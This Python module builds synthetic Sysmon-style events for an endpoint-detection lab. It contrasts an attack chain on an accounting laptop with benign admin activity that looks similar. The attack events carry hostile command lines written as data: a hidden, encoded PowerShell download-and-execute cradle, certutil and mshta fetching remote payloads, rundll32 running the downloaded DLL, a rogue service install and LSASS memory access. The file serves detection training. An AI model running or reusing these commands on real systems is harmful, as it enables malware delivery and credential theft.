"""Synthetic Sysmon-like events for the EDR lab. All data is fake.

Event IDs follow Sysmon: 1 = process create, 3 = network connect, 10 = process access,
11 = file create. 7045 is NOT Sysmon: it is the Windows System log event "a service
was installed" (Service Control Manager).

Hosts:
  WS-ACCT-07   an accounting laptop with a full attack chain (synthetic)
  WS-IT-02     an IT admin workstation with busy but BENIGN activity
  SRV-DC01     a domain controller (protected host: isolation needs approval)
"""

from __future__ import annotations

import base64


def ps_encode(script: str) -> str:
    """Encode text the way PowerShell -EncodedCommand expects (UTF-16LE, then base64)."""
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


# Harmless strings: they are only text inside synthetic events, nothing runs them.
_STAGE1 = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')"
_ADMIN_SCRIPT = "Get-Service | Where-Object Status -eq 'Running' | Out-File C:\\Temp\\svc.txt"

SYSTEM = "NT AUTHORITY\\SYSTEM"
PS_PATH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
WORD_PATH = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"


def _ev(ts, host, event_id, **kw):
    return {"ts": ts, "host": host, "event_id": event_id, **kw}


def attack_chain() -> list[dict]:
    h = "WS-ACCT-07"
    u = "EXAMPLE\\mlopez"
    return [
        _ev("2026-11-17T09:02:10Z", h, 1, guid="G-100", pid=4120,
            image="C:\\Windows\\explorer.exe", parent_guid=None, parent_image=None,
            command_line="C:\\Windows\\Explorer.EXE", user=u),
        _ev("2026-11-17T09:03:41Z", h, 1, guid="G-101", pid=5200, image=WORD_PATH,
            parent_guid="G-100", parent_image="C:\\Windows\\explorer.exe",
            command_line='"WINWORD.EXE" "C:\\Users\\mlopez\\Downloads\\invoice_Nov.docm"', user=u),
        _ev("2026-11-17T09:03:47Z", h, 1, guid="G-102", pid=6032, image=PS_PATH,
            parent_guid="G-101", parent_image=WORD_PATH,
            command_line="powershell.exe -NoP -W Hidden -Enc " + ps_encode(_STAGE1), user=u),
        _ev("2026-11-17T09:03:49Z", h, 3, guid="G-102", pid=6032, image=PS_PATH,
            dest_ip="203.0.113.50", dest_port=443, user=u),
        _ev("2026-11-17T09:04:02Z", h, 1, guid="G-103", pid=6100,
            image="C:\\Windows\\System32\\certutil.exe", parent_guid="G-102", parent_image=PS_PATH,
            command_line="certutil.exe -urlcache -split -f http://203.0.113.50/update.bin "
                         "C:\\Users\\Public\\update.dll", user=u),
        _ev("2026-11-17T09:04:09Z", h, 11, guid="G-103", pid=6100,
            image="C:\\Windows\\System32\\certutil.exe",
            target_filename="C:\\Users\\Public\\update.dll", user=u),
        _ev("2026-11-17T09:04:15Z", h, 1, guid="G-104", pid=6200,
            image="C:\\Windows\\System32\\rundll32.exe", parent_guid="G-102", parent_image=PS_PATH,
            command_line="rundll32.exe C:\\Users\\Public\\update.dll,Run", user=u),
        _ev("2026-11-17T09:04:30Z", h, 1, guid="G-105", pid=6300,
            image="C:\\Windows\\System32\\mshta.exe", parent_guid="G-102", parent_image=PS_PATH,
            command_line="mshta.exe http://198.51.100.20/payload.hta", user=u),
        _ev("2026-11-17T09:05:10Z", h, 7045, service_name="WinUpdateHelper",
            service_file="C:\\ProgramData\\upd\\svc.exe", service_start="auto start",
            user=SYSTEM, guid=None),
        _ev("2026-11-17T09:06:00Z", h, 10, guid="G-104", pid=6200,
            image="C:\\Users\\Public\\procx.exe",
            target_image="C:\\Windows\\System32\\lsass.exe", granted_access="0x1010",
            user=u),
    ]


def benign_admin() -> list[dict]:
    """Busy but legitimate. Nothing here should raise an alert."""
    h = "WS-IT-02"
    u = "EXAMPLE\\admin.kpatel"
    return [
        _ev("2026-11-17T08:00:00Z", h, 1, guid="B-1", pid=900,
            image="C:\\Windows\\explorer.exe", parent_guid=None, parent_image=None,
            command_line="C:\\Windows\\Explorer.EXE", user=u),
        # Admin runs a script file from a console: normal.
        _ev("2026-11-17T08:05:00Z", h, 1, guid="B-2", pid=1000, image=PS_PATH, parent_guid="B-1",
            parent_image="C:\\Windows\\explorer.exe",
            command_line="powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\inventory.ps1",
            user=u),
        # Management agent pushes an encoded command. Parent is NOT Office.
        _ev("2026-11-17T08:10:00Z", h, 1, guid="B-3", pid=1100, image=PS_PATH,
            parent_guid=None, parent_image="C:\\Windows\\CCM\\CcmExec.exe",
            command_line="powershell.exe -NonInteractive -EncodedCommand " + ps_encode(_ADMIN_SCRIPT),
            user=SYSTEM),
        # certutil used for a file hash, not a download.
        _ev("2026-11-17T08:20:00Z", h, 1, guid="B-4", pid=1200,
            image="C:\\Windows\\System32\\certutil.exe", parent_guid="B-1",
            parent_image="C:\\Windows\\explorer.exe",
            command_line="certutil.exe -hashfile C:\\Tools\\installer.msi SHA256", user=u),
        # rundll32 opening a Control Panel applet from System32.
        _ev("2026-11-17T08:25:00Z", h, 1, guid="B-5", pid=1300,
            image="C:\\Windows\\System32\\rundll32.exe", parent_guid="B-1",
            parent_image="C:\\Windows\\explorer.exe",
            command_line="rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL inetcpl.cpl",
            user=u),
        # Vendor service installed from Program Files.
        _ev("2026-11-17T08:30:00Z", h, 7045, service_name="ExampleBackupAgent",
            service_file='"C:\\Program Files\\Example Backup\\agent.exe"',
            service_start="auto start", user=SYSTEM, guid=None),
        # Defender's engine reads LSASS memory: allowed, signed, system path.
        _ev("2026-11-17T08:40:00Z", h, 10, guid="B-6", pid=2000,
            image="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2\\MsMpEng.exe",
            target_image="C:\\Windows\\System32\\lsass.exe", granted_access="0x1010", user=SYSTEM),
        # A normal system process touches LSASS with a harmless right.
        _ev("2026-11-17T08:41:00Z", h, 10, guid="B-7", pid=500,
            image="C:\\Windows\\System32\\wininit.exe",
            target_image="C:\\Windows\\System32\\lsass.exe", granted_access="0x1000", user=SYSTEM),
    ]


def dc_noise() -> list[dict]:
    """A quiet domain controller. Used to show a host with no alerts."""
    return [
        _ev("2026-11-17T07:00:00Z", "SRV-DC01", 1, guid="D-1", pid=700,
            image="C:\\Windows\\System32\\services.exe", parent_guid=None, parent_image=None,
            command_line="services.exe", user=SYSTEM),
    ]


def all_events() -> list[dict]:
    return attack_chain() + benign_admin() + dc_noise()
